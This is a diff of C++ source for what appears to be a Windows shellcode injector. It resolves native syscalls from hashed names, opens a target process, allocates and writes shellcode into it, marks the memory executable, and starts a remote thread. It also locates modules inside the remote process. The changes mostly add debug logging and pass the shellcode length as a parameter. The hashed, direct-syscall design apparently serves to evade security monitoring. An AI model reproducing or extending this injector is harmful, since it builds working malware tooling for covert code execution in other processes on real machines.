@@ -23,6 +23,8 @@ injectorMethod mainInjector;
     }
 
     HANDLE injectorMethod::process(int process_id) {
+
+        std::cout << "-------In injectorMethod::process function-------\n";
         //std::cout << "received int process_id : " << process_id << "\n";
         CLIENT_ID cid = {};
         cid.UniqueProcess = (HANDLE)(UINT_PTR)process_id;
@@ -50,36 +52,39 @@ injectorMethod mainInjector;
             &oa,
             cid
         );
-
+		std::cout << "status after syscall: " << status << "\n";
         if (status != 0 || hProcess == NULL) {
             //std::cout << "[-] NtOpenProcess failed: " << status << "\n";
             return NULL;
         }
-
+		std::cout << "--------Exiting injectorMethod::process function with handle: " << hProcess << "---------\n";
         return hProcess;
     }
 
 
     NTSTATUS injectorMethod::wrMem(HANDLE hProcess, LPVOID rBuffer, PVOID shellcode, SIZE_T len_shellcode) {
         //std::cout << "in write Memory func\n\n";
-
+        std::cout << "-------In wrMem function-------\n";
 
 
         syscallHandling::SYSCALL_DATA structNtWriteVirtualMemory = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 2515773330);
         wsysNtWriteVirtualMemory = structNtWriteVirtualMemory.syscallAddress;
-        //std::cout << "syscall adress for NtWriteVirtualMemory: " << wsysNtWriteVirtualMemory << "\n";
+        std::cout << "syscall adress for NtWriteVirtualMemory: " << wsysNtWriteVirtualMemory << "\n";
         ssnsysNtWriteVirtualMemory = structNtWriteVirtualMemory.ssn;
-        //std::cout << "ssn for NtWriteVirtualMemory: " << ssnsysNtWriteVirtualMemory;
+        std::cout << "ssn for NtWriteVirtualMemory: " << ssnsysNtWriteVirtualMemory;
         SIZE_T bytesWritten = 0;
+		std::cout << "executing syscall with hanlde: " << hProcess << " buffer: " << rBuffer << " PVOID shellcode: " << shellcode << " len_shellcode: " << len_shellcode << "\n";
         NTSTATUS status = sysNtWriteVirtualMemory(hProcess, rBuffer, shellcode, len_shellcode, &bytesWritten);
         std::cout << "\nstatus after syscall: " << status << "\n";
         std::cout << "bytes written: " << bytesWritten << "\n";
         std::cout << "\nshellcode len: " << len_shellcode << "\n";
+
+        std::cout << "-------exiting wrMem function and returning status-------\n";
         return status;
 
     }
 
-    NTSTATUS injectorMethod::protectMem(HANDLE proc, LPVOID buff) {
+    NTSTATUS injectorMethod::protectMem(HANDLE proc, LPVOID buff, SIZE_T len_shellcode) {
 
 
         syscallHandling::SYSCALL_DATA structNtProtectVirtualMemory = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 136929992);
@@ -90,7 +95,7 @@ injectorMethod mainInjector;
 
 
         DWORD oldProtect = 0;
-        SIZE_T len_shellcode = shellcode_len;
+        
         NTSTATUS status = sysNtProtectVirtualMemory(proc, &buff, &len_shellcode, PAGE_EXECUTE_READ, &oldProtect);
         //std::cout << "NtProtectVirtualMemory: " << status << " error: " << GetLastError() << "\n";
 
@@ -98,43 +103,43 @@ injectorMethod mainInjector;
 
     }
 
-    NTSTATUS injectorMethod::protectMemFlag(HANDLE proc, LPVOID buff, ULONG flag) {
+    NTSTATUS injectorMethod::protectMemFlag(HANDLE proc, LPVOID buff, ULONG flag, SIZE_T len_shellcode) {
 
-
+        std::cout << "-------In protectMemFlag function-------\n";
         syscallHandling::SYSCALL_DATA structNtProtectVirtualMemory = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 136929992);
         ssnsysNtProtectVirtualMemory = structNtProtectVirtualMemory.ssn;
         wsysNtProtectVirtualMemory = structNtProtectVirtualMemory.syscallAddress;
-        //std::cout << "sycalls adress for NtProtectVirtualMemory: " << wsysNtProtectVirtualMemory << "\n";
-        //std::cout << "ssn for NtProtectVirtualMemory: " << ssnsysNtProtectVirtualMemory << "\n";
+        std::cout << "sycalls adress for NtProtectVirtualMemory: " << wsysNtProtectVirtualMemory << "\n";
+        std::cout << "ssn for NtProtectVirtualMemory: " << ssnsysNtProtectVirtualMemory << "\n";
 
 
         DWORD oldProtect = 0;
-        SIZE_T len_shellcode = shellcode_len;
+		std::cout << "executing syscall with proc: " << proc << " buff: " << buff << " len_shellcode: " << len_shellcode << " flag: " << flag << "\n";
         NTSTATUS status = sysNtProtectVirtualMemory(proc, &buff, &len_shellcode, flag, &oldProtect);
         //std::cout << "NtProtectVirtualMemory: " << status << " error: " << GetLastError() << "\n";
-
+		std::cout << "-----exiting protectMemFlag with status: " << status << "-----\n";
         return status;
 
     }
     LPVOID injectorMethod::vAlloc(HANDLE hProcess, PVOID addr, SIZE_T shellcode_len) {
-
+		std::cout << "-------In injectorMethod::vAlloc function-------\n";
         //std::cout << "in vAlloc";
         syscallHandling::SYSCALL_DATA structNtAllocateVirtualMemory =
             syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 1737737036);
 
         wsysNtAllocateVirtualMemory = structNtAllocateVirtualMemory.syscallAddress;
-        //std::cout << "syscall adress for NtAllocateVirtualMemory: " << wsysNtAllocateVirtualMemory << "\n";
+        std::cout << "syscall adress for NtAllocateVirtualMemory: " << wsysNtAllocateVirtualMemory << "\n";
         ssnsysNtAllocateVirtualMemory = structNtAllocateVirtualMemory.ssn;
-        //std::cout << "ssn for NtAllocateVirtualMemory: " << ssnsysNtAllocateVirtualMemory;
+        std::cout << "ssn for NtAllocateVirtualMemory: " << ssnsysNtAllocateVirtualMemory;
 
         if (hProcess == (HANDLE)-1) {
             PVOID baseAddr = NULL; // Must be NULL for the kernel to assign an address
-            SIZE_T regionSize = shellcode_len;
+            
             NTSTATUS status = sysNtAllocateVirtualMemory(
                 hProcess,
                 &baseAddr,
                 0,
-                &regionSize,
+                &shellcode_len,
                 MEM_RESERVE | MEM_COMMIT,
                 PAGE_READWRITE
             );
@@ -149,13 +154,13 @@ injectorMethod mainInjector;
             MEM_RESERVE | MEM_COMMIT,
             PAGE_READWRITE
         );
-        //std::cout << "returned status from sysNtAllocateVirtualMemory: " << status;
+        std::cout << "returned status from sysNtAllocateVirtualMemory: " << status;
 
         if (status != 0) {
-            //std::cout << "NtAllocateVirtualMemory failed: " << status << std::endl;
+            std::cout << "NtAllocateVirtualMemory failed: " << status << std::endl;
             return NULL;
         }
-        //std::cout << "returning addr" << addr;
+        std::cout << "------exiting vAlloc : returning LPVOID to addr" << addr << "  ------\n";
         return addr;
 
     }
@@ -169,7 +174,7 @@ injectorMethod mainInjector;
     }
     HANDLE injectorMethod::ntThread(HANDLE proc, LPVOID lpStartAddress, LPVOID lpParameter) {
 
-
+        std::cout << "-------In ntThread function-------\n";
         HANDLE hThread = NULL;
 
 
@@ -191,7 +196,7 @@ injectorMethod mainInjector;
             0,                      // SizeOfStackReserve
             NULL                    // BytesBuffer
         );
-        //std::cout << "\nNtCreateThreadEx status: " << status << "\n";
+        std::cout << "\nNtCreateThreadEx status: " << status << "\n";
         //std::cout << "hThread: " << hThread << "\n";
 
         //NtWaitForSingleObject
@@ -200,7 +205,7 @@ injectorMethod mainInjector;
         ssnsysNtWaitForSingleObject = structNtWaitForSingleObject.ssn;
         sysNtWaitForSingleObject(hThread, FALSE, NULL);
 
-
+		std::cout << "-------Exiting ntThread function with handle: " << hThread << "---------\n";
         return hThread;
     }
 
@@ -213,7 +218,7 @@ injectorMethod mainInjector;
 
     PVOID injectorMethod::findRemoteModule(HANDLE hProcess, const wchar_t* targetDllName) {
 
-
+        std::cout << "-------In findRemoteModule function-------\n";
         syscallHandling::SYSCALL_DATA structNtQueryInformationProcess = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 3493133410);
         ssnsysNtQueryInfoProcess = structNtQueryInformationProcess.ssn;
         wsysNtQueryInfoProcess = structNtQueryInformationProcess.syscallAddress;
@@ -257,12 +262,15 @@ injectorMethod mainInjector;
 
             // Check if it's our target
             if (_wcsicmp(moduleName, targetDllName) == 0) {
+				std::cout << "[+] Found target module: " << moduleName << " at base address: " << entry.DllBase << "\n";
+				std::cout << "-------exiting findRemoteModule function -----" << "\n";
                 return entry.DllBase;
             }
 
             pCurrentNode = entry.InLoadOrderLinks.Flink;
         }
-
+		std::cout << "didnt find the module in the remote process, returning null \n";
+        std::cout << "-------exiting findRemoteModule function -----" << "\n";
         return NULL;
     };
 
